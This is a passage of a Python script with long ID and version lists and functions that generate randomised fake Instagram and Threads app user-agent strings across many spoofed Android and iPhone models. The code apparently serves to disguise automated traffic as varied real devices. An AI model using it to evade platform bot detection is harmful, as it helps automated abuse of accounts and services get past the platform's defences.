'119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
	igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
	igve=igv.split(",")
	versi=random.choice(igve)
	realme = random.choice(["RMX3997","RMX3765","RMX3820","RMX3765","RMX3999","RMX3997","RMX3997","RMX3999","RMX3820","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3765","RMX3910","RMX3997","RMX3765","RMX3998","RMX3765","RMX3765","RMX3910","RMX3765","RMX3765","RMX3765","RMX3765","RMX3765","RMX3999","RMX3999","RMX3910","RMX3765","RMX3999","RMX3765","RMX3997","RMX3910","RMX3765","RMX3999","RMX3999","RMX3997","RMX3765","RMX3998","RMX3997","RMX3765","RMX3820","RMX3998","RMX3765","RMX3999","RMX3998","RMX3998","RMX3765","RMX3765","RMX3765","RMX3999","RMX3910","RMX3161","RMX3997","RMX3997","RMX3765","RMX3765","RMX3765","RMX3998","RMX3765","RMX3999","RMX3765","RMX3997","RMX3765","RMX3997","RMX3820","RMX3765","RMX3997","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3999","RMX3997","RMX3820","RMX3997","RMX3997","RMX3999","RMX3997","RMX3765","RMX3910","RMX3820","RMX3997","RMX3765","RMX3999","RMX3999","RMX3999","RMX3765","RMX3997","RMX3998","RMX3820","RMX3999","RMX3910","RMX3765","RMX3997","RMX3765","RMX3999","RMX3997","RMX3765","RMX3997","RMX3820","RMX3999","RMX3997"])
	ara1 = ('Barcelona 289.0.0.77.109 Android ({}; {}; Realme; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, realme))
	samsung = random.choice(["SM-A115F","Samsung A4","Samsung A4","samsung a1","SM-A145R","samsung a1","SM-G973F","SM-A346B","SM-G973F","SM-S9280","SM-E156B","SM-E146B","samsung a1","SM-A346B","Samsung A4","SM-E546B","SM-A346B","SM-A145R","SM-A336B","GT-S5660","Samsung A4","samsung a1","SM-E156B","SM-A115F","SM-S9160","SM-A336B","Samsung A4","samsung a1","SM-A346B","samsung a1","SM-A115F","SM-A115F","Samsung A4","SM-A145R","SM-A136B","SM-S9280","SM-A115F","SM-S9280","SM-E546B","SM-A336B","SM-A136B","Samsung A4","SM-A115F","SM-A145R","samsung a1","SM-A336B","SM-A136B","SM-A336B","SM-G973F","SM-A336B","GT-S5660","Samsung A4","GT-S5660","Samsung A4","SM-A015M","Samsung A4","SM-A115F","SM-E546B","SM-E156B","SM-A015M","SM-A136B","SM-A336B","SM-E546B","SM-A145R","SM-A136B","SM-A015M","SM-A115F","Samsung A4","GT-S5660","SM-S9160","Samsung A4","SM-E146B","SM-A136B","SM-E546B","SM-G973F","Samsung A4","SM-A336B","SM-G973F","SM-A015M","SM-S9280","SM-A115F","Samsung A4","Samsung A4","SM-A115F","Samsung A4","samsung a1","GT-S5660","SM-A346B"])
	ara2 = ('Barcelona 289.0.0.77.109 Android ({}; {}; samsung; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, samsung))
	infinix = random.choice(["23046RP50C","22127RK46C","23054RA19C","MiTV-AESP0","22041216UC","22041216UC","2312CRNCCL","22041216UC","MiTV-AESP0","22041216UC","24040RN64Y","22041216UC","23046PNC9C","2312CRNCCL","23046RP50C","2312CRNCCL","23113RKC6C","22101320C","22041216UC","22041216UC","24040RN64Y","23046RP50C","22101320C","21091116AC","MiTV-AESP0","22101320C","2312CRNCCL","23046RP50C","2312CRNCCL","2312CRNCCL","23046RP50C","23013RK75C","22101320C","22122RK93C","2312CRNCCL","23013RK75C","23113RKC6C","22041216UC","2312CRNCCL","23046PNC9C","24030PN60G","22101320C","22041216UC","2312CRNCCL","23013RK75C","22041216UC","23113RKC6C","22101320C","24040RN64Y","2312CRNCCL","24040RN64Y","23046RP50C","22101320C","2312CRNCCL","23046PNC9C","22041216UC","2312CRNCCL","22122RK93C","22041216UC","23013RK75C","2312CRNCCL","22041216UC","2312CRNCCL","22122RK93C","22101320C","22041216UC","24040RN64Y","MiTV-AESP0","MiTV-AESP0","MiTV-AESP0","22041216UC","22101320C","22101320C","2404ARN45A","23046RP50C","23046PNC9C","21091116AC","21091116AC","22127RK46C","21091116AC","22101320C","23113RKC6C","24030PN60G","22101320C","23046RP50C","23113RKC6C","23046RP50C","22101320C","22127RK46C","23113RKC6C","2312CRNCCL","21091116AC","23046PNC9C","22041216UC","23046RP50C","MiTV-AESP0","24040RN64Y","21091116AC","23113RKC6C","2312CRNCCL","24040RN64Y","24040RN64Y","22122RK93C","23113RKC6C","22101320C","2312CRNCCL","MiTV-AESP0","23113RKC6C","MiTV-AESP0","24040RN64Y","22041216UC"])
	ara5 = ('Barcelona 289.0.0.77.109 Android ({}; {}; Xiaomi; {}; marlin; qcom; in_ID)'.format(Android_Version(android_version), android_version, dpi_pixel, infinix))
	motorola = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901'])
	ara6 = ('Barcelona 289.0.0.77.109 Android ({}; {}; motorola; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, motorola))
	user_agent = random.choice([ara1, ara2, ara5, ara6])
	return user_agent

def UserAgentApp():
	code = random.choice(['370911961','370911964','370911965','370911966','370911967','370911968','370911971','370911972','370911973','370911974','370911975','370911976','370911977','371025731'])
	app_version = random.randint(100, 342)
	android_version = random.randint(25, 31)
	app_patch_version = random.randint(14, 46)
	build_number = random.randint(85, 125)
	bahasa = random.choice(['en_US', 'id_ID'])
	realme = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; realme; RMX3782; RE5C6CL1; mt6835; {bahasa}; {code})'
	huawai = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/10; 480dpi; 1080x2282; HUAWEI; FRL-L22; HWFRL-M; mt6768; {bahasa}; {code})'
	samsung = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; samsung; SM-A225F; A225FXXU3BVF1; mt6768; {bahasa}; {code})'
	xiaomi = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; Xiaomi; Redmi 9A; M2006C3LG; mt6768; {bahasa}; {code})'
	vivo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; vivo; vivo 2007; PD1969F_EX; mt6768; {bahasa}; {code})'
	oppo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; OPPO; CPH2083; CPH2083_11_A.53; mt6768; {bahasa}; {code})'
	iphone = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone 12; iPhone12,1; {bahasa}; {code})'
	iphone_x = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone X; iPhone10,3; {bahasa}; {code})'
	google_pixel = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Google; Pixel 5; GD1Y; mt6768; {bahasa}; {code})'
	infinix = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Infinix; Infinix Note 10; X6812; mt6768; {bahasa}; {code})'
	pragmatyc = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Pragmatyc; Pragmatyc Device; PGT-1; mt6768; {bahasa}; {code})'
